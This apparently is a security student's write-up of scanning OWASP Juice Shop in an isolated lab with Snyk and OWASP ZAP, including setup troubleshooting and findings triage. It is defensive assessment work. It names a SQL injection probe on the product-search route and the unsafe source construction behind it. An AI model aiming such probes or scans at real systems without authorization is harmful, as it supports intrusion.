# My Project 2A SCA, SAST and DAST Scanning: Application and API Security Assessment Journey

- **Core technologies:** Ubuntu in WSL, a hardened Ubuntu admin node, a hardened Ubuntu target node, Docker, OWASP Juice Shop, Snyk Open Source, Snyk Code, and OWASP ZAP.
- **Problem addressed:** I needed to assess an intentionally vulnerable web application across its dependencies, source code, web behavior, and API authorization, then record findings for the teams responsible for remediation.
- **Outcome:** I completed SCA and SAST scans, used ZAP baseline and AJAX Spider scans for DAST, and assessed API security with ZAP API Scan plus targeted manual checks. I documented individual findings, triage, and remediation ownership in this repository. I did not modify Juice Shop or remediate the findings; the next action belongs to the development/service owners.

I started this project with the same WSL workstation and hardened servers I had used for Project 1A Linux Server Hardening. I wanted to see what security issues I could find in the Juice Shop source and running application, then prepare clear evidence for the teams who would fix them. I worked through the code scans first, brought the application online for web testing, and finished by checking API behavior with ZAP and two test accounts. I record the problems I hit along the way because getting the test setup right was part of the work.

## The lab scenario

I continued the lab from Project 1A Linux Server Hardening, reusing its three-node layout: my Windows workstation running Ubuntu in WSL, the admin node, and the target node. I checked the current host and network state as I added application security testing; I did not assume that every earlier setting was still active.

I used the previously hardened Ubuntu target node to host **OWASP Juice Shop**, a deliberately vulnerable web application built for security training. I ran the application in a Docker container, which kept its process and packages in a separate container environment while the Project 1A Linux Server Hardening controls remained on the host. I published the web port on the target's private lab interface and reached it through the lab network and SSH forwarding path. That kept the training application inside the lab network while giving me a running target for web and API assessment. Juice Shop's vulnerabilities are intentional; I used them to practise finding, validating, classifying, and handing off issues.

I split the assessment into four related parts:

1. **SCA — Software Composition Analysis:** identify known vulnerabilities in direct and transitive dependencies.
2. **SAST — Static Application Security Testing:** a **white-box** assessment because I had access to Juice Shop's source code. Snyk Code inspected source paths and code patterns without executing those paths in the running service. In this lab, that let me connect alerts to files and lines and review whether a pattern belonged to application code, tests, or an intentional training challenge.
3. **DAST — Dynamic Application Security Testing:** a **black-box** assessment of the running Juice Shop over HTTP using ZAP's baseline and AJAX Spider. I tested from the outside through the exposed web interface without giving those scans source-code access. In this lab, ZAP observed reachable pages, headers, and responses; it could not know the source intent or fully establish authenticated authorization behavior from the unauthenticated crawl.
4. **API Security:** an API-focused assessment of discovered routes, access control, token validation, input handling, and response behavior. I used ZAP API Scan for automated requests and separate, narrowly scoped manual checks for authenticated object-level authorization and token acceptance. The API scan is dynamic testing of API endpoints; it is presented separately here because the questions and evidence concern API-specific controls.

I was not the Juice Shop developer, so I kept this project focused on the DevSecOps part of the work: collect evidence, explain impact and uncertainty, prioritize findings, and hand actionable remediation work to development and service owners. I did not change the application code. The developers own those fixes; DevSecOps supports prioritization and later verification.

### The three-node layout

| Node | Role in this project |
| --- | --- |
| WSL workstation | Snyk CLI work, ZAP control and reporting, curl/Python checks, and SSH tunnels to the lab. |
| Admin node | Management point used to inspect the target and verify reachability to the application. |
| Target node | Previously hardened Ubuntu host running the Juice Shop Docker container. |

The test path was deliberately kept within the lab network. I verified basic HTTP reachability before interpreting scanner output; an unavailable target produces timeouts or HTTP `000`, which says nothing about whether an endpoint is vulnerable.

| Stage | Sequence |
| --- | --- |
| [1. Prepare the code and tools](#1-prepare-the-code-and-tools) | Locate the project → check Node/npm and Snyk → install dependencies → install Docker on the target and check its service and routes. |
| [2. SCA](#2-sca--software-composition-analysis) | Scan dependencies → interpret advisory/path output → preserve individual findings. |
| [3. SAST](#3-sast--static-application-security-testing) | Scan source → separate application code from tests/challenge examples → record findings. |
| [4. DAST](#4-dast--dynamic-application-security-testing) | Restore target reachability → baseline crawl → AJAX Spider → interpret scan limits. |
| [5. API Security](#5-api-security) | Run ZAP API Scan → combine tool evidence with bounded two-account, token, and response checks. |
| [6. Assessment handoff](#6-assessment-handoff) | Consolidate findings → triage → create developer issues → leave remediation to owners. |

**Starting point:** The servers had been hardened in Project 1A Linux Server Hardening and the Juice Shop source checkout was available in WSL. I used the lab accounts and SSH access already established for this environment. I did not include private key material or account passwords in this repository.

## 1. Prepare the code and tools

### 1.1 I checked the source checkout before running Snyk

SCA and SAST need the correct project directory. I changed into the Juice Shop checkout and checked which files were present:

```bash
cd ~/project-2a/juice-shop-source
pwd
ls -l package.json package-lock.json
```

The checkout had `package.json`, but no `package-lock.json`. That mattered because dependency scans should use the dependency tree resolved for the project, and a lockfile makes the exact versions reproducible. The checkout also initially had no `node_modules` directory.

### 1.2 I fixed missing Node.js and npm in WSL

My first version check failed with `node: command not found` and `npm: command not found`. I was in WSL, where the source checkout lived. The packages on the target server could not satisfy a missing tool in this shell. I ran the checks and installed Node.js and npm here:

```bash
node --version
npm --version
sudo apt update
sudo apt install nodejs npm
node --version
npm --version
```

I tried Snyk Test once before the project dependencies existed. It stopped with `Missing node_modules folder: We can't test without dependencies. Please run 'npm install' first.` I then installed the dependencies in the checkout and checked that the directory existed:

```bash
cd ~/project-2a/juice-shop-source
"$HOME/.local/bin/snyk" test
npm install
ls -ld node_modules
```

That solved the missing-dependencies error. Because the checkout had no checked-in lockfile, the locally resolved tree was not a fully reproducible record of the original build. I kept that limit with the SCA findings.

### 1.3 I checked Snyk CLI access

The Snyk CLI was available in my WSL user's local binary directory. If I were preparing a fresh WSL account, I would install it under that account and add its bin directory to `PATH`; I would then authenticate interactively. I kept the CLI user-scoped instead of installing it system-wide:

```bash
npm install --prefix "$HOME/.local" snyk
export PATH="$HOME/.local/bin:$PATH"
"$HOME/.local/bin/snyk" --version
"$HOME/.local/bin/snyk" auth
```

Snyk authentication was configured for the lab account. I did not put authentication tokens or other credentials in commands or commit them to the repository.

### 1.4 I installed Docker on the target and checked its network state

The Juice Shop application needed a container runtime on the **target node**. I reached that node through the admin node, installed Ubuntu's `docker.io` package, and checked the service before trying to load an image. The retained paste begins with `apt` output rather than the installation command itself, so the first block shows the repeatable terminal sequence and the second block records what `apt` reported:

```bash
# WSL workstation: connect to the admin node.
ssh -i ~/.ssh/mds_admin_ed25519 mdsadmin@192.168.56.101

# Admin node: connect to the target node.
ssh -i ~/.ssh/mds_target_ed25519 mdsadmin@192.168.77.10

# Target node: install the Docker package.
sudo apt update
sudo apt install docker.io
```

<details>
<summary>Docker installation output preserved from the target</summary>

```text
Selecting previously unselected package bridge-utils.
(Reading database… 98771 files and directories currently installed.)
Preparing to unpack …/bridge-utils_1.7.1-4ubuntu3_amd64.deb…
Unpacking bridge-utils (1.7.1-4ubuntu3)…
Selecting previously unselected package containerd.
Preparing to unpack …/containerd_2.2.2-0ubuntu1.2_amd64.deb…
Unpacking containerd (2.2.2-0ubuntu1.2)…
Selecting previously unselected package dnsmasq-base.
Preparing to unpack …/dnsmasq-base_2.92-1ubuntu0.5_amd64.deb…
Unpacking dnsmasq-base (2.92-1ubuntu0.5)…
Selecting previously unselected package dns-root-data.
Preparing to unpack …/dns-root-data_2025080400build1_all.deb…
Unpacking dns-root-data (2025080400build1)…
Selecting previously unselected package docker.io.
Preparing to unpack …/docker.io_29.1.3-0ubuntu4.1_amd64.deb…
Unpacking docker.io (29.1.3-0ubuntu4.1)…
Selecting previously unselected package pigz.
Preparing to unpack ./pigz_2.8-1build1_amd64.deb…
Unpacking pigz (2.8-1build1)…
Selecting previously unselected package runc.
Preparing to unpack …/runc_1.4.0-0ubuntu1_amd64.deb…
Unpacking runc (1.4.0-0ubuntu1)…
Selecting previously unselected package ubuntu-fan.
Preparing to unpack ./ubuntu-fan_0.12.17_all.deb…
Unpacking ubuntu-fan (0.12.17)…
Setting up bridge-utils (1.7.1-4ubuntu3)…
Setting up dnsmasq-base (2.92-1ubuntu0.5)…
Setting up dns-root-data (2025080400build1)…
Setting up pigz (2.8-1build1)…
Setting up runc (1.4.0-0ubuntu1)…
Setting up ubuntu-fan (0.12.17)…
Created symlink '/etc/systemd/system/multi-user.target.wants/ubuntu-fan.service' → '/usr/lib/systemd/system/ubuntu-fan.service'.
Setting up containerd (2.2.2-0ubuntu1.2)…
Created symlink '/etc/systemd/system/multi-user.target.wants/containerd.service' → '/usr/lib/systemd/system/containerd.service'.
Setting up docker.io (29.1.3-0ubuntu4.1)…
Created symlink '/etc/systemd/system/multi-user.target.wants/docker.service' → '/usr/lib/systemd/system/docker.service'.
Created symlink '/etc/systemd/system/sockets.target.wants/docker.socket' → '/usr/lib/systemd/system/docker.socket'.
Processing triggers for man-db (2.13.1-1build1)…
Processing triggers for dbus (1.16.2-2ubuntu4)…
Connection to 192.168.77.10 closed.
Connection to 192.168.56.101 closed.
```

</details>

The `docker.io`, `containerd`, and `runc` packages were installed, and `apt` created systemd service and socket links. I did not treat the links alone as proof that Docker was running. From **WSL**, I made the two-hop service check shown in the lab record:

```bash
ssh -i ~/.ssh/mds_admin_ed25519 mdsadmin@192.168.56.101 \
  'ssh -i ~/.ssh/mds_target_ed25519 mdsadmin@192.168.77.10 systemctl is-active docker'
```

It returned `active`. Docker can add a virtual bridge and routes, so I also checked the target's route table through the same path before loading Juice Shop:

```bash
ssh -i ~/.ssh/mds_admin_ed25519 mdsadmin@192.168.56.101 \
  'ssh -i ~/.ssh/mds_target_ed25519 mdsadmin@192.168.77.10 ip route'
```

The pasted record does not include the route output, so I use the command to show the check without claiming a specific route change. Later, when HTTP requests timed out, I returned to the target's interface, Docker bridge, and forwarding rules in Section 4.1.

**Checkpoint:** Node.js/npm and Snyk were ready in WSL, and Docker reported `active` on the target. I could scan the source and dependencies while preparing the containerized app for DAST.

## 2. SCA — Software Composition Analysis

### 2.1 I scanned the resolved dependency tree

I used SCA to compare the project's resolved packages with known vulnerability advisories. A vulnerable package is a useful lead, but its scanner severity alone does not tell me whether the affected code is included or reachable in the running application. After installing dependencies, I ran Snyk Open Source from the **WSL terminal**:

```bash
"$HOME/.local/bin/snyk" test --dev
```

The `--dev` option included development dependencies. This widened coverage to build and test packages, so I needed to retain each dependency path and later distinguish likely runtime packages from tooling. Snyk reported **87 advisory/path entries**: **2 Critical, 36 High, 47 Medium, and 2 Low**. The full individual records are in [sca-individual-findings.md](sca-individual-findings.md); the corresponding SCA/SAST triage rows are in [risk-register-sca-sast.csv](risk-register-sca-sast.csv).

### 2.2 I treated dependency paths as part of the evidence

Two Critical entries stood out for follow-up:

- `marsdb@0.6.11`, reported with an arbitrary code injection advisory and shown as a direct introduced dependency.
- `decompress@4.2.1`, reported with a directory traversal advisory through `download@8.0.0`.

The output also contained High findings in legacy JWT packages, lodash, and other transitive/build-related chains. I preserved the package, advisory, severity, and dependency path rather than collapsing different paths into one count. A developer or service owner would next establish whether each dependency is shipped, imported, reachable, and covered by a supported upgrade.

**Problem and lesson:** The source checkout had no lockfile. Although `npm install` created a local dependency tree that Snyk could scan, this did not prove that the result exactly represented a previous build or the image running on the target. I recorded that limitation and kept dependency/runtime validation as a triage action instead of presenting the scan as an image SBOM.

**Checkpoint:** SCA identified vulnerable package versions and dependency chains. It did not establish exploitability in the running app or complete remediation. Those require application/build context and a later rescan.

## 3. SAST — Static Application Security Testing

### 3.1 I scanned first-party source separately

SAST was white-box in this project because I had the Juice Shop source checkout. I could see the files and let Snyk Code analyze the code paths without sending requests to the running service. That source access let me review whether an alert came from application code, a test, or a training challenge. From the **WSL terminal**, I ran:

```bash
"$HOME/.local/bin/snyk" code test
```

The supplied Snyk Code output contained **306 individual records**: **26 High**, **11 Medium**, and **269 Low**. Of those, **240 Low** records were in `test/` paths. I preserved each individual record in [sast-individual-findings.md](sast-individual-findings.md) with the finding ID, title, severity, and path so reviewers can inspect the source context.

### 3.2 I separated application paths from test fixtures and challenges

The path is important evidence. The 26 High records were in application-source paths; 23 were in route, frontend, or library paths, and three were under `data/static/codefixes/`, which may be training examples. There were no High records under `test/` in the supplied results. Many Low records were in tests and should not automatically become production application tickets unless the test material is shipped or contains a real secret.

Juice Shop intentionally includes vulnerable implementations to support training. That context does not make a scanner alert false by itself: the result still needs source review, challenge context, and an understanding of what is built and deployed. The triage file marks uncertain items as candidates pending that review.

I also reviewed high-priority source locations from the **WSL terminal** to see whether findings were in application code, tests, or challenge material. `rg` was not installed in my environment, so I used these standard tools for the source lookup:

```bash
cd ~/project-2a/juice-shop-source
grep -n -C 5 'criteria\|literal\|query' routes/search.ts
sed -n '1,140p' routes/search.ts
grep -RIn --include='*.ts' 'req\.query\|sequelize\.literal' routes lib
```

The source review found that `routes/search.ts` builds a SQL expression using the product-search query value. This helped connect the ZAP SQL alert to the source. Reading the code confirmed unsafe construction; it did not demonstrate data extraction or prove that every related scanner alert was exploitable.

**Checkpoint:** SAST supplied code locations and risky patterns for developer review because this was a white-box scan with source access. No application source was changed during this assessment, and scanner output was not treated as proof that every record is exploitable in production.

## 4. DAST — Dynamic Application Security Testing

### 4.1 I restored a testable path to Juice Shop

The first ZAP baseline had reached Juice Shop through local port 3000. Later requests returned timeouts and HTTP `000`, so I paused before treating any scan failure as an application result. I checked the local SSH port, then traced the request through the admin node, target host, Docker bridge, and container. A listening SSH process only proved that a local socket existed; it did not prove that the application at the other end was answering.

On the **target node**, I first checked the private interface, running container, image tag, and published port:

```bash
ip -br -4 addr
sudo docker ps -a --filter name=juice-shop
sudo docker inspect juice-shop --format 'Image={{.Config.Image}} State={{.State.Status}} PortBindings={{json .HostConfig.PortBindings}}'
```

I found that Juice Shop was already running as `bkimminich/juice-shop:latest`, with TCP 3000 published only on the target's private lab interface. I had tried to transfer and start `v20.3.0`, but the container-name conflict prevented that. I did not replace the running instance, so the final checks were against the existing `latest` image; its exact version was not pinned.

The binding kept the published port on the lab interface. Docker's separate network namespace isolated the application process from the host environment, while the earlier Linux hardening still protected host access. I also checked the host's firewall and Docker forwarding rules on the **target node**:

```bash
sudo ufw status verbose
sudo iptables -t nat -S DOCKER
sudo iptables -t nat -L DOCKER -n -v
sudo iptables -S FORWARD
sudo iptables -S DOCKER
sudo iptables -L DOCKER -n -v
sudo iptables -L DOCKER-USER -n -v
sudo iptables -L DOCKER-FORWARD -n -v
```

UFW was inactive, and Docker had DNAT and forwarding rules for TCP 3000. The packet counters showed traffic reaching Docker's port-forwarding rules. I used those outputs to trace the route, then relied on an HTTP request from WSL as the end-to-end check.

I first tried to pull the image directly on the lab server, but Docker Hub name resolution failed there. I then pulled the image into WSL. Starting it from WSL with the target server's private address also failed because Docker could not publish that remote address from the WSL Docker context. These are the pull and run commands I used while diagnosing that:

```bash
# Target node — this pull failed because Docker Hub DNS resolution failed.
sudo docker pull bkimminich/juice-shop:v20.3.0

# WSL workstation
# Replace these placeholders with the lab's assigned addresses.
TARGET_IP='<TARGET_LAB_PRIVATE_IP>'
ADMIN_IP='<ADMIN_NODE_IP>'
ADMIN_USER='mdsadmin'

# Pull into the WSL Docker context, then try to publish on the target address.
docker pull bkimminich/juice-shop:v20.3.0
sudo docker run -d --name juice-shop \
  -p "$TARGET_IP:3000:3000" \
  bkimminich/juice-shop:v20.3.0

# After pulling the image into WSL, save it to a tar file for transfer.
docker save -o ~/project-2a/juice-shop-v20.3.0.tar bkimminich/juice-shop:v20.3.0
scp -i ~/.ssh/mds_admin_ed25519 \
  ~/project-2a/juice-shop-v20.3.0.tar \
  "$ADMIN_USER@$ADMIN_IP:/tmp/juice-shop-v20.3.0.tar"
```

An initial load attempt on the **admin node** returned `docker: command not found` in that shell, so I could not confirm that the transferred tar was loaded there. The command I attempted was:

```bash
# Admin node
sudo docker load -i /tmp/juice-shop-v20.3.0.tar
```

This was confusing because `docker ps` and `docker images` depend on which Docker daemon I am connected to. An empty result from WSL only meant there was no matching container in WSL's Docker context; it did not say what was running on the lab server. In a later server session, I checked the server's daemon directly:

```bash
# Target Docker host
sudo docker images bkimminich/juice-shop
sudo docker ps -a --filter name=juice-shop
```

I found that a container named `juice-shop` was already running. I tried to start another instance, but the name conflict prevented it from creating a new container:

```bash
# Target Docker host; replace the placeholder with the target's private lab address.
TARGET_IP='<TARGET_LAB_PRIVATE_IP>'
sudo docker run -d --name juice-shop \
  -p "$TARGET_IP:3000:3000" \
  bkimminich/juice-shop:latest
```

I checked the existing container instead of assuming the image transfer had replaced it:

```bash
# Target node
sudo docker ps -a --filter name=juice-shop
sudo docker inspect juice-shop --format 'Image={{.Config.Image}} State={{.State.Status}} PortBindings={{json .HostConfig.PortBindings}}'
sudo docker logs --tail 80 juice-shop
```

That showed the existing `juice-shop` container was up from `bkimminich/juice-shop:latest` with TCP 3000 mapped to the target's private interface. The logs showed application requests, including `Unexpected path` messages; those log entries did not explain the WSL timeout. A container-local request and a Docker-bridge request both returned HTTP 200, so I narrowed the remaining failure to the client-to-target path. This Node-based command is a repeatable way to check the HTTP listener inside the Node.js application container:

```bash
# Target node: check the app in its own network namespace
sudo docker exec juice-shop node -e "require('http').get('http://127.0.0.1:3000/', r => { console.log('HTTP', r.statusCode); r.resume() }).on('error', e => { console.error(e.message); process.exit(1) })"

# Target node: discover the container address and check through the Docker bridge
CONTAINER_IP="$(sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' juice-shop)"
curl -sS -o /dev/null -w 'Container-bridge HTTP %{http_code}\n' \
  --max-time 5 "http://$CONTAINER_IP:3000/"
```

I also checked the target from the **admin node**. I had mistakenly tried to run my WSL SSH command again after I was already logged in as `mdsadmin`; that shell did not have my WSL private key and the SSH attempt returned `Permission denied (publickey)`. The useful test from inside the admin node was the direct HTTP request to the target's private interface:

```bash
# WSL workstation: enter the admin node using the key stored in WSL.
ADMIN_IP='<ADMIN_NODE_IP>'
ssh -i ~/.ssh/mds_admin_ed25519 "mdsadmin@$ADMIN_IP"

# Admin node: request Juice Shop through the private lab network.
TARGET_IP='<TARGET_LAB_PRIVATE_IP>'
curl -sS -o /dev/null -w 'Admin-to-target HTTP %{http_code}\n' \
  --max-time 5 "http://$TARGET_IP:3000/"
```

The admin-to-target request returned HTTP 200. This separated a working target and lab network from the unreliable WSL forwarding path.

I checked why the original local test still returned HTTP `000` by looking for processes using ports 3000 and 3001:

```bash
# WSL workstation
ss -ltnp 'sport = :3000'
ss -ltnp 'sport = :3001'
TARGET_IP='<TARGET_LAB_PRIVATE_IP>'
curl -sS -o /dev/null -w 'WSL-to-target HTTP %{http_code}\n' \
  --max-time 5 "http://$TARGET_IP:3000/"
```

The direct WSL-to-target request timed out, while the admin-to-target request had returned HTTP 200. Port 3000 was already held by an SSH process, and a tunnel was also already listening on 3001 in another terminal. Trying to start a second tunnel on either port only produced “Address already in use.” This is the port-3000 command that failed:

```bash
# WSL workstation — this failed because local port 3000 was already occupied.
TARGET_IP='<TARGET_LAB_PRIVATE_IP>'
ADMIN_IP='<ADMIN_NODE_IP>'
ADMIN_USER='mdsadmin'
ssh -N -L 3000:"$TARGET_IP":3000 \
  -i ~/.ssh/mds_admin_ed25519 \
  "$ADMIN_USER@$ADMIN_IP"
```

I left the existing tunnel in the other terminal and tested it. It timed out at first. After checking the application inside its container and through the Docker bridge, I tested the existing port-3001 forward again. It returned HTTP 200. If I need to start that forward from scratch, this is the command I use in a dedicated **WSL terminal**; I leave it open and do not start a duplicate:

```bash
# WSL workstation — replace the placeholders with this lab's addresses.
TARGET_IP='<TARGET_LAB_PRIVATE_IP>'
ADMIN_IP='<ADMIN_NODE_IP>'
ADMIN_USER='mdsadmin'
ssh -N -L 3001:"$TARGET_IP":3000 \
  -i ~/.ssh/mds_admin_ed25519 \
  "$ADMIN_USER@$ADMIN_IP"
```

In a second WSL terminal, I confirmed that the tunnel reached the app:

```bash
# First, this request through the old port-3000 forward timed out.
curl -sS -o /dev/null -w 'HTTP %{http_code}\n' --max-time 5 \
  http://localhost:3000/
curl -v --max-time 5 http://localhost:3000/ -o /dev/null

# I then checked the existing port-3001 forward.
ss -ltnp 'sport = :3001'
curl -sS -o /dev/null -w 'HTTP %{http_code}\n' \
  --max-time 10 http://localhost:3001/
```

The curl returned HTTP 200. The `ss` listener check by itself was not enough; only the HTTP response confirmed end-to-end reachability. The earlier HTTP `000` and timeout results were network-path failures, not findings.

That HTTP 200 was the reachability checkpoint for the later scans.

### 4.2 I ran ZAP baseline and AJAX Spider scans

I ran the first ZAP web scans while the original port-3000 path was responding. The target URL in those preserved reports and crawler results was `http://host.docker.internal:3000`. That forward later became unreliable, which is why I traced the network path in 4.1 and used port 3001 for the later API scan. ZAP performed a black-box DAST assessment: it interacted with the live application over HTTP without reading the source. The baseline run discovered 116 URLs and reported **0 FAIL alerts**, **3 warning types**, and **58 PASS checks**. The warning types included missing Content Security Policy, cross-domain configuration, and the informational modern-web-application classification.

The AJAX-enabled baseline discovered **35 URLs**, **0 FAIL alerts**, **3 warning types**, and **58 PASS checks** in its separate run. A direct Spider API crawl found 94 traditional Spider URLs and 91 AJAX Spider URLs. The AJAX crawl exposed API routes and client-loaded resources that the traditional crawl missed. These counts came from different runs/settings; I recorded them as crawl coverage rather than comparing them as vulnerability counts.

**Problems I encountered:** One AJAX attempt timed out while the SSH tunnel was down. A separate attempt reached ZAP but failed with `The starting URI is not in scope`. I inspected the ZAP container log and retried the crawl with the target URL and scope aligned. The later direct AJAX result contained 91 Juice Shop URLs. The exact scope correction was not retained in the terminal record, so the rerun command below leaves `inScope` unset. These setup errors were not application vulnerabilities.

The scan was black-box: ZAP evaluated externally visible behavior and did not inspect source code. The SAST stage supplied the complementary white-box view of code paths. For API-specific probing, I describe ZAP's API Scan with the API Security results in the next section.

**Checkpoint:** DAST discovered reachable pages and response-level behaviors from the outside. The report distinguishes observed responses from source-confirmed issues and scanner signals that still need endpoint-specific validation.

#### Reproduction commands

The exact ZAP CLI invocation and exported scan configuration from the original runs were not retained in the chat, so these are reproducible CLI equivalents, not a claim that these exact lines produced the recorded counts. The results and counts above came from the completed lab scans. I checked the rerun options against ZAP's [Baseline Scan documentation](https://www.zaproxy.org/docs/docker/baseline-scan/).

```bash
cd ~/project-2a
mkdir -p zap-reports
ZAP_TARGET='http://host.docker.internal:3000'

# Passive baseline crawl
docker run --rm -t \
  --add-host=host.docker.internal:host-gateway \
  -v "$PWD/zap-reports:/zap/wrk/:rw" \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t "$ZAP_TARGET" -r zap-baseline.html

# Baseline crawl with the AJAX Spider enabled
docker run --rm -t \
  --add-host=host.docker.internal:host-gateway \
  -v "$PWD/zap-reports:/zap/wrk/:rw" \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t "$ZAP_TARGET" -j -r zap-baseline-ajax.html
```

The ZAP container must resolve `host.docker.internal` to the WSL host and reach port 3001. If it cannot, I check scanner-to-target connectivity before treating the output as a scan result. The target remains the isolated lab instance.

#### I used the ZAP API to compare the two crawlers

I wanted to know whether the traditional Spider had reached the application's JavaScript-loaded API routes. I checked ZAP's Spider result list, then its AJAX Spider result list. The retained outputs show **94** traditional URLs and **91** AJAX URLs; the traditional list had no `/api/` path. The ZAP container was named `zap-crawl-api`; its log showed it listening on port **8090**, spidering `host.docker.internal:3000`, and reporting the scope error. These are the relevant checks and an API command sequence for repeating the comparison. The exact original API call sequence was not saved, so I do not present these commands as the source of the recorded counts:

```text
ZAP is now listening on 0.0.0.0:8090
Starting spidering scan on http://host.docker.internal:3000
java.lang.IllegalStateException: The starting URI is not in scope.
```

```bash
# WSL terminal; use the running ZAP daemon shown in the retained logs.
docker ps --filter name=zap-crawl-api
docker logs --tail 80 zap-crawl-api
docker port zap-crawl-api 8090/tcp
# Set this to the host port printed above; 8090 is the rerun example.
ZAP_API='http://127.0.0.1:8090'
mkdir -p ~/project-2a/zap-reports
read -r -s -p 'Local ZAP API key: ' ZAP_API_KEY; echo

# Check that the ZAP API is answering before starting a crawl.
curl -sS --get "$ZAP_API/JSON/core/view/version/" \
  --data-urlencode "apikey=$ZAP_API_KEY"

# Start a traditional Spider crawl and retain the scan ID returned by ZAP.
SPIDER_ID="$(curl -sS --get "$ZAP_API/JSON/spider/action/scan/" \
  --data-urlencode "apikey=$ZAP_API_KEY" \
  --data-urlencode 'url=http://host.docker.internal:3000/' \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["scan"])')"
while :; do
  SPIDER_STATUS="$(curl -sS --get "$ZAP_API/JSON/spider/view/status/" \
    --data-urlencode "apikey=$ZAP_API_KEY" \
    --data-urlencode "scanId=$SPIDER_ID" \
    | python3 -c 'import json,sys; print(json.load(sys.stdin)["status"])')"
  printf 'Traditional Spider: %s%%\n' "$SPIDER_STATUS"
  [ "$SPIDER_STATUS" = '100' ] && break
  sleep 5
done
curl -sS --get "$ZAP_API/JSON/spider/view/results/" \
  --data-urlencode "apikey=$ZAP_API_KEY" \
  --data-urlencode "scanId=$SPIDER_ID" \
  -o ~/project-2a/zap-reports/spider-results.json

# The rerun leaves inScope unset after the earlier scope error.
# Start the AJAX Spider, wait until ZAP reports stopped, then save its URLs.
curl -sS --get "$ZAP_API/JSON/ajaxSpider/action/scan/" \
  --data-urlencode "apikey=$ZAP_API_KEY" \
  --data-urlencode 'url=http://host.docker.internal:3000/'
while :; do
  AJAX_STATUS="$(curl -sS --get "$ZAP_API/JSON/ajaxSpider/view/status/" \
    --data-urlencode "apikey=$ZAP_API_KEY" \
    | python3 -c 'import json,sys; print(json.load(sys.stdin)["status"])')"
  printf 'AJAX Spider: %s\n' "$AJAX_STATUS"
  [ "$AJAX_STATUS" = 'stopped' ] && break
  sleep 5
done
curl -sS --get "$ZAP_API/JSON/ajaxSpider/view/results/" \
  --data-urlencode "apikey=$ZAP_API_KEY" \
  -o ~/project-2a/zap-reports/ajax-spider-results.json
unset ZAP_API_KEY
```

I counted URLs and checked which paths were new to the AJAX result. In the retained run, ten exact URL strings appeared in both lists and 81 strings appeared only in AJAX. Socket.IO query values made some URLs look unique even when they represented the same route. I treated that comparison as **discovery coverage**, then used the discovered API routes in the next section.

```bash
# WSL terminal; inspect the two saved JSON result files without printing bodies.
python3 - <<'PY'
import json
from pathlib import Path
from urllib.parse import urlparse

root = Path.home() / 'project-2a/zap-reports'
def urls(filename):
    items = json.loads((root / filename).read_text()).get('results', [])
    return {item if isinstance(item, str) else item.get('url')
            for item in items} - {None}

spider = urls('spider-results.json')
ajax = urls('ajax-spider-results.json')
for name, urls in [('traditional', spider), ('AJAX', ajax)]:
    print(name, 'URLs:', len(urls))
    print(name, '/api/ paths:', sum('/api/' in urlparse(url).path for url in urls))
print('shared exact URLs:', len(spider & ajax))
print('AJAX-only exact URLs:', len(ajax - spider))
PY
```


## 5. API Security

I used two methods to assess API security. ZAP API Scan discovered routes and sent generated requests across the imported API surface. I then used two lab accounts to answer questions the unauthenticated scan could not answer: could one user read another user's basket, and would the application accept an unsigned token? I kept those checks read-only.

### 5.1 I ran the ZAP API Scan and established the API surface

The AJAX Spider and API Scan surfaced routes including challenge and quantity endpoints, product search, languages, application version/configuration, and user-related routes. The API Scan imported 16 URLs and reported 53 total URLs, 108 PASS checks, 0 FAIL, and 7 warning types. Its report listed 37 endpoints, all using GET, and noted slow responses. It was unauthenticated and covered only the imported API surface plus scanner-generated requests.

For a repeatable CLI run, I need an OpenAPI definition containing the routes to assess. The original import file was not retained. I can build a **small replacement definition from the routes preserved in the AJAX output**, then run the ZAP API Scan. This replacement covers the seven routes listed below; it will not reproduce the original report's 16 imported URLs, 37 endpoints, or alert counts exactly. I record the original results above and use these commands as a runnable portfolio example:

```bash
cd ~/project-2a
mkdir -p zap-reports
cat > juice-shop-api.yaml <<'YAML'
openapi: 3.0.3
info:
  title: Juice Shop lab API route sample
  version: '1.0'
servers:
  - url: http://host.docker.internal:3001
paths:
  /api/Challenges/:
    get:
      parameters:
        - {name: name, in: query, schema: {type: string}}
      responses: {'200': {description: Challenge data}}
  /api/Quantitys/:
    get:
      responses: {'200': {description: Quantity data}}
  /rest/admin/application-configuration:
    get:
      responses: {'200': {description: Application configuration}}
  /rest/admin/application-version:
    get:
      responses: {'200': {description: Application version}}
  /rest/continue-code:
    get:
      responses: {'200': {description: Continue code response}}
  /rest/languages:
    get:
      responses: {'200': {description: Languages}}
  /rest/products/search:
    get:
      parameters:
        - {name: q, in: query, schema: {type: string}}
      responses: {'200': {description: Search results}}
YAML

docker run --rm -t \
  --add-host=host.docker.internal:host-gateway \
  -v "$PWD:/zap/wrk/:rw" \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-api-scan.py \
  -t /zap/wrk/juice-shop-api.yaml \
  -f openapi \
  -r /zap/wrk/zap-reports/juice-shop-api-active.html
```

The imported definition and authentication configuration determine coverage. The recorded API Scan was unauthenticated, so it did not test the two-account authorization case below. The replacement command follows ZAP's [API Scan documentation](https://www.zaproxy.org/docs/docker/api-scan/). When I reviewed the original HTML report, I used this parser to find the SQL Injection alert and the affected route without dumping the whole report to the terminal:

```bash
python3 - <<'PY'
from html.parser import HTMLParser
from pathlib import Path

class Text(HTMLParser):
    def __init__(self):
        super().__init__()
        self.parts = []
    def handle_data(self, value):
        if value.strip():
            self.parts.append(value.strip())

report = Path.home() / 'project-2a/zap-reports/juice-shop-api-active.html'
parser = Text()
parser.feed(report.read_text(errors='replace'))
body = ' '.join(' '.join(parser.parts).split())
for term in ('SQL Injection', '/rest/products/search'):
    pos = body.lower().find(term.lower())
    print(f'--- {term} ---')
    print(body[max(0, pos - 300):pos + 900] if pos >= 0 else 'Not found')
PY
```


ZAP reported a SQL Injection alert on `GET /rest/products/search?q=q%27` with an HTTP 500 response. Source review independently found that `routes/search.ts` interpolated the query value into a SQL template string. I recorded unsafe SQL construction as a source-confirmed weakness, while making clear that the scanner's 500 was not proof of data extraction. The SQL injection route is also an intentional Juice Shop training challenge.

Other ZAP API observations included server-error responses, unexpected content types, missing CSP, wildcard CORS, timestamps, and a private IP value in configuration output. The available evidence did not establish sensitive stack-trace disclosure, authenticated cross-origin data access, or secret exposure. The API and DAST appendices preserve the counts and examples with their limits.

